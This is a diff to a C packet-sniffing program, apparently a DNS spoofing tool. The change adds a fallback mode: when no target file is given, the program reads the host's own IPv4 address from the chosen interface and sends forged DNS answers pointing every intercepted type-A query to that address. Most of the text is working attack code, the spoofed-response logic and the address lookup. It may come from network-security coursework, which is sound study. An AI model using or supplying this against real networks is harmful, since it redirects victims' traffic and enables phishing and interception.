@@ -9,7 +9,35 @@
 #include <netinet/if_ether.h>
 #include <assert.h>
 #include <errno.h>
+#include <ifaddrs.h>
+/*
+    struct ifaddrs * ifAddrStruct=NULL;
+    struct ifaddrs * ifa=NULL;
+    void * tmpAddrPtr=NULL;
 
+    getifaddrs(&ifAddrStruct);
+
+    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr) {
+            continue;
+        }
+        if (ifa->ifa_addr->sa_family == AF_INET) { // check it is IP4
+            // is a valid IP4 Address
+            tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+            char addressBuffer[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
+            printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer); 
+        } else if (ifa->ifa_addr->sa_family == AF_INET6) { // check it is IP6
+            // is a valid IP6 Address
+            tmpAddrPtr=&((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
+            char addressBuffer[INET6_ADDRSTRLEN];
+            inet_ntop(AF_INET6, tmpAddrPtr, addressBuffer, INET6_ADDRSTRLEN);
+            printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer); 
+        } 
+    }
+    if (ifAddrStruct!=NULL) freeifaddrs(ifAddrStruct);
+    return 0;
+*/
 
 // structure definition at https://www.winpcap.org/docs/docs_40_2/html/group__wpcap__tut6.html
 /* 4 bytes IP address */
@@ -87,6 +115,8 @@ typedef struct __attribute__((packed, aligned(1))) chksum_hdr {
 	uint8_t		protocol;
 	uint16_t	len;	
 } chksum_hdr;
+
+char 	myip[INET_ADDRSTRLEN];
 
 void
 print_payload( u_char	*ptr,
@@ -325,21 +355,34 @@ process_packet(	u_char 				*attack_filename,
 		if (ntohs(quest->qtype) != 1)
 			return;
 
-		status = 0;
-		status = check_attack_target(domain_name, attack_filename, target_ip);
-		if (status == 0)
-			continue;
+		if (attack_filename != NULL) {
+			status = 0;
+			status = check_attack_target(domain_name, attack_filename, target_ip);
+			if (status == 0)
+				continue;
 
-		status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
-						   target_ip, 
-						   header->len - (14 + ip_header_len + 8),
-						   (uint32_t *)(packet + 14 + 12),
-						   udp->sport);
-		if (status != 0) {
-			printf("\nUnable to send spoofed DNS response to target !\n");
-			return;
+			status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
+							   target_ip, 
+							   header->len - (14 + ip_header_len + 8),
+							   (uint32_t *)(packet + 14 + 12),
+							   udp->sport);
+                        if (status != 0) {
+                                printf("\nUnable to send spoofed DNS response to target !\n");
+                                return;
+                        }
+                        printf("with fake data (%s, %s)\n", domain_name, target_ip);
+		} else {
+                        status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
+                                                           myip,
+                                                           header->len - (14 + ip_header_len + 8),
+                                                           (uint32_t *)(packet + 14 + 12),
+                                                           udp->sport);
+			if (status != 0) {
+				printf("\nUnable to send spoofed DNS response to target !\n");
+				return;
+			}
+			printf("with fake data (%s, %s)\n", domain_name, myip);
 		}
-		printf("with fake data (%s, %s)\n", domain_name, target_ip);
 	}
 }
 
@@ -387,12 +430,15 @@ sniff_packet(char        *interface,
 }
 
 int main(int argc, char **argv) {
-	char 	errbuf[PCAP_ERRBUF_SIZE], option;
-	int	count = 0;
-	char	*interface = NULL;
-	char	*attack_filename = NULL;
-	char	bpf_filter[50] = {0};
-	int	index = -1;	
+	char 			errbuf[PCAP_ERRBUF_SIZE], option;
+	int			count = 0;
+	char			*interface = NULL;
+	char			*attack_filename = NULL;
+	char			bpf_filter[50] = {0};
+	int			index = -1;
+	void			*entry = NULL;
+        struct ifaddrs 		*list = NULL;
+        struct ifaddrs 		*member = NULL;
 
 	while ((option = getopt(argc, argv, "i:f:")) != -1) {
 		switch(option) {
@@ -438,6 +484,26 @@ int main(int argc, char **argv) {
         	}
         	printf("\nSniffing on default device: %s\n", interface);
 	}
+
+	if (attack_filename == NULL) {
+		// http://stackoverflow.com/questions/212528/get-the-ip-address-of-the-machine
+    		getifaddrs(&list);
+    		for (member = list; member != NULL; member = member->ifa_next) {
+        		if (!member->ifa_addr) {
+            			continue;
+        		}
+			
+			if ( member->ifa_addr->sa_family == AF_INET &&
+			     strcmp(interface, member->ifa_name) == 0) {
+ 
+            			entry = &((struct sockaddr_in *)member->ifa_addr)->sin_addr;
+            			inet_ntop(AF_INET, entry, myip, INET_ADDRSTRLEN);
+            			printf("%s IP Address %s\n", member->ifa_name, myip);
+				break; 
+        		}
+		}
+	}	
+
 	printf("===========================================\n");
 	sniff_packet(interface, bpf_filter, attack_filename);
 
